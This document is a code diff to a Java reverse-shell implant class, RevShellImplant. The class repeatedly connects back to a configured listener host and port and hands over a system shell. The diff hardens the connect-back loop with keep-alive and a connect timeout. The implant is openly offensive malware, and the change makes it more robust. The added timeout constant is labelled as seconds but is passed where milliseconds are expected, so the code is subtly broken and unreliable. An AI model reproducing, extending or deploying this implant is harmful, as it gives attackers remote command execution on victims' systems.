@@ -4,6 +4,7 @@ import java.io.Closeable;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.nio.file.FileSystem;
 import java.nio.file.FileSystems;
@@ -30,6 +31,8 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      * TCP port number to use when connecting back.
      */
     static volatile int CONF_LPORT = 12345;
+
+    static volatile int CONF_TIMEOUT_SECONDS = 10;
 
     /**
      * Amount of seconds to wait between connection attempts.
@@ -85,10 +88,11 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
         while (!Thread.interrupted()) {
             log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
-            try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT);
+            try (Socket connection = new Socket()) {
+                connection.setKeepAlive(true);
+                connection.connect(new InetSocketAddress(CONF_LHOST, CONF_LPORT), CONF_TIMEOUT_SECONDS);
                 InputStream fromRemote = connection.getInputStream();
                 OutputStream toRemote = connection.getOutputStream();
-            ) {
                 log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
 
                 String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
